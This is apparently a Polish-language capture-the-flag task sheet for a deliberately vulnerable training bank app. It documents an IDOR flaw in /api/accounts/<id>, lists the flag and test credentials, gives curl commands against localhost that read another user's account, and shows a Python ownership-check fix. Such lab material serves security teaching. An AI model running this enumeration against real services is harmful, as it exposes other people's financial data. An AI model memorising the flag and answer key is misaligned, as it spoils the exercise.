# A01 — Broken Access Control (IDOR)

## Metadane
- **ID:** A01
- **Kategoria:** OWASP A01:2025 - Broken Access Control
- **Trudność:** easy
- **Punkty:** 100
- **Flaga:** `PWR{idor_account_takeover}`

## Opis
Endpoint `/api/accounts/<id>` zwraca szczegóły konta bankowego po jego ID.
Problem: backend nie sprawdza czy konto należy do zalogowanego użytkownika.
Każdy zalogowany użytkownik może pobrać dane **dowolnego** konta.

## Podatny endpoint
```
GET /api/accounts/<account_id>
Authorization: Bearer <twój_token>
```

## Exploit krok po kroku
1. Zaloguj się jako `bob@vulnbank.pl` / `password123`
2. Sprawdź ID swojego konta: `GET /api/accounts/`
3. Zmień ID na `1`: `GET /api/accounts/1`
4. W odpowiedzi znajdź pole `internal_note` — tam jest flaga

```bash
# Krok 1: Zaloguj się
TOKEN=$(curl -s -X POST http://localhost:5000/api/auth/login \
  -H "Content-Type: application/json" \
  -d '{"email":"bob@vulnbank.pl","password":"password123"}' \
  | python3 -c "import sys,json; print(json.load(sys.stdin)['token'])")

# Krok 2: Pobierz konto alice (id=1)
curl -H "Authorization: Bearer $TOKEN" http://localhost:5000/api/accounts/1
```

## Jak to naprawić
```python
account = Account.query.get_or_404(account_id)
if account.user_id != int(get_jwt_identity()):
    return jsonify({"error": "Brak dostępu"}), 403
```

## Referencje
- OWASP A01:2025 - Broken Access Control
- [CWE-639: Authorization Bypass Through User-Controlled Key](https://cwe.mitre.org/data/definitions/639.html)
